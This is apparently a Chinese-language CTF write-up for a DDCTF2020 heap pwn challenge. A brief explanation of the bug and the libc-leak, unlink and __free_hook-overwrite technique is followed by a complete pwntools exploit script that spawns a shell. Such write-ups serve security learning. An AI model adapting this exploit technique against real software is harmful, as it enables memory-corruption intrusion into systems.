DDCTF2020 pwn

Posted on 2020-09-21 | In pwn , wp

这个程序的洞在 show 的时候会 push 一个 0xaabbccdd，当申请新的 chunk 时并没有更新 start 指针，这样就有可能造成 edit 向下溢出。

利用方法全程参考这篇writeup。将一个0x90的chunk通过show释放进入unsortedbin，因为未更新start指针，可以leak出libc；因为程序没开pie，可以通过show来实现unlink（向后合并堆块，太菜了学到了），修改bss地址来造成任意地址写，之后覆写free_hook为system来get shell。

exp:

from pwn import *

context.log_level = 'debug'

p = process('./pwn1')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(num):
    p.sendlineafter('>>',str(1))
    p.sendlineafter('num:',str(num))

def clear():
    p.sendlineafter('>>',str(3))

def show():
    p.sendlineafter('>>',str(2))

def edit(con):
    p.sendlineafter('(y/n):','y')
    p.sendline(str(con))


for i in range(16):
    add(i)
show()
p.recvuntil('1:')
libc_base = int(p.recvline())-0x3c4b78
p.info('libc_base: '+hex(libc_base))

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search('/bin/sh\x00'))
free_hook = libc_base + libc.sym['__free_hook']

for i in range(34):
    p.sendlineafter('(y/n):','n')
clear()

for i in range(8):
    add(0x20)
show()

for i in range(8):
    p.sendlineafter('Edit (y/n):','n')
edit('-16')
edit(0x90)
edit(0)
edit(0x21)
edit(0x605398 - 0x18)
edit(0x605398 - 0x10)
for i in range(4):
    p.sendlineafter('Edit (y/n):','n')

#gdb.attach(p)
#pause()
for i in range(7):
    add(i)
show()
edit(free_hook - 8)
edit(free_hook + 8)
edit(0)
edit(0x605398)
edit(0x6053A8)
show()
edit(0x68732F6E69622F)
edit(system)
clear()

#gdb.attach(p)
p.interactive()
# pwn
